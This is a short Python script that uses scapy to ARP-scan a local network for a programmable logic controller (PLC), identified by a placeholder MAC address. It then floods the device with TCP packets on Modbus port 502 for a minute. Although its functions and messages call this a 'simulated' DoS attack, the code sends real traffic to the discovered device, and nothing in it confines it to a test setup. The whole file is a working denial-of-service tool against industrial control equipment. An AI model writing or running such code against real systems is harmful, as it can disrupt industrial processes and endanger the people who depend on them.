import socket
import scapy.all as scapy
import time

# Function to discover the PLC's IP address
def discover_plc_ip():
    # Define the network range to scan (e.g., 192.168.9.0/24)
    network = "192.168.9.0/24"
    
    # Create an ARP request packet
    arp_request = scapy.ARP(pdst=network)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    
    # Send the packet and capture the response
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    
    # Filter the response to find the PLC
    for element in answered_list:
        ip = element[1].psrc
        mac = element[1].hwsrc
        print(f"IP: {ip}, MAC: {mac}")
        if mac == "00:11:22:33:44:55":  # Replace with the actual MAC address of the PLC
            return ip
    return None

# Function to simulate a DoS attack
def simulate_dos_attack(plc_ip, duration=60):
    print(f"Starting DoS attack on {plc_ip} for {duration} seconds.")
    start_time = time.time()
    
    while time.time() - start_time < duration:
        # Send a large number of packets to the PLC
        packet = scapy.IP(dst=plc_ip) / scapy.TCP(dport=502)  # Modbus port
        scapy.send(packet, count=100, inter=0.01, verbose=False)
        time.sleep(1)
    
    print("DoS attack simulation completed.")

# Main function
def main():
    # Discover the PLC's IP address
    plc_ip = discover_plc_ip()
    if plc_ip:
        print(f"PLC found at IP: {plc_ip}")
        # Simulate the DoS attack
        simulate_dos_attack(plc_ip)
    else:
        print("PLC not found on the network.")

if __name__ == "__main__":
    main()